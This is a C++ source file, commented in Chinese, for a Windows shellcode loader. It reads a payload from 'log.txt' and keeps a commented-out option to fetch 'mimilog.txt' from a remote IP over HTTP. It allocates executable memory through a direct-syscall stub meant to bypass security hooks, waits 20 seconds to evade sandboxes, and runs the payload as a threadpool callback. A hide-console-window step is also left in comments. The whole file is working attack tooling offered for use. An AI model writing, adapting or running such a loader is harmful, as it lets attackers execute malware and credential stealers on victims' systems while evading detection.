// callback.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
#include <iostream>
#include <Windows.h>
#include <mutex>
#include <DbgHelp.h>
#include "NtAllocateVirtualMemory.h"
#include <fstream>
#include <vector>
#include <string>
#include <filesystem>
#include <Wininet.h>
#pragma comment(lib, "Wininet.lib")

std::vector<unsigned char> DownloadShellcode(const char* url) {
    std::vector<unsigned char> shellcode;
    HINTERNET hInternet = InternetOpenA("MyApp", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION, 0);
        if (hUrl) {
            DWORD bytesRead = 0;
            const DWORD bufferSize = 4096;
            BYTE buffer[bufferSize];
            while (InternetReadFile(hUrl, buffer, bufferSize, &bytesRead) && bytesRead != 0) {
                shellcode.insert(shellcode.end(), buffer, buffer + bytesRead);
            }
            InternetCloseHandle(hUrl);
        }
        InternetCloseHandle(hInternet);
    }
    return shellcode;
}

std::vector<char> readFileUsingFilesystem(const std::string& filePath) {
    namespace fs = std::filesystem;

    if (!fs::exists(filePath)) {
        //std::cerr << "文件不存在: " << filePath << std::endl;
        return {};
    }
    std::ifstream file(filePath, std::ios::binary);
    if (!file) {
        //std::cerr << "无法打开文件: " << filePath << std::endl;
        return {};
    }
    std::vector<char> buffer;
    buffer.reserve(fs::file_size(filePath)); // 预分配内存
    buffer.assign((std::istreambuf_iterator<char>(file)),
        std::istreambuf_iterator<char>());
    return buffer;
}

bool CreateAndTriggerEvent(PTP_WAIT_CALLBACK WaitCallback) {
    // 创建事件对象
    HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
    if (hEvent == NULL) {
        //std::cerr << "Failed to create event." << std::endl;
        return false;
    }

    // 创建线程池等待对象
    PTP_WAIT wait = CreateThreadpoolWait(WaitCallback, NULL, NULL);
    if (wait == NULL) {
        //std::cerr << "Failed to create wait object." << std::endl;
        CloseHandle(hEvent);
        return false;
    }

    // 将事件关联到线程池等待对象
    SetThreadpoolWait(wait, hEvent, NULL);

    // 模拟触发事件
    if (!SetEvent(hEvent)) {
        //std::cerr << "Failed to set event." << std::endl;
        CloseThreadpoolWait(wait);
        CloseHandle(hEvent);
        return false;
    }

    // 进入无限等待，确保shellcode的线程不会执行完就退出
    WaitForSingleObject(GetCurrentProcess(), INFINITE);

    // 清理资源
    //CloseThreadpoolWait(wait);
    //CloseHandle(hEvent);
    return true;
}

int main() {
    // 读取文件内容
    //std::vector<unsigned char> data = DownloadShellcode("http://192.168.43.170:8000/mimilog.txt");
    // 隐藏窗口
    //HWND hWnd = GetConsoleWindow();
    //ShowWindow(hWnd, SW_HIDE);

    std::vector<char> data = readFileUsingFilesystem("log.txt");
    if (data.empty()) {
        //std::cerr << "读取文件失败或文件为空，程序退出。" << std::endl;
        //return 1;
    }
    PVOID Address2 = nullptr;
    SIZE_T size = data.size();
    // 分配虚拟内存
    //PVOID Address1 =  VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    //std::cin.get();

    NTSTATUS status = Sw3NtAllocateVirtualMemory(GetCurrentProcess(), &Address2, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != 0) {
        std::cerr << "内存分配失败，错误代码: " << status << std::endl;
        return 1;
    }
    // 将文件内容复制到分配的内存中
    //std::copy(data.begin(), data.end(), static_cast<char*>(Address1));
    std::copy(data.begin(), data.end(), static_cast<char*>(Address2));

    WaitForSingleObject(GetCurrentProcess(), 20000);
    // if (!EnumChildWindows(NULL, (WNDENUMPROC)Address, NULL)) {
    //     //std::cerr << "EnumChildWindows 调用失败，错误代码: " << GetLastError() << std::endl;
    // }
    // 释放虚拟内存
    //CreateAndTriggerEvent((PTP_WAIT_CALLBACK)Address1);
    CreateAndTriggerEvent((PTP_WAIT_CALLBACK)Address2);
    //VirtualFree(Address, 0, MEM_RELEASE);
    //std::cout << "程序结束，资源已释放。" << std::endl;
    return 0;
}
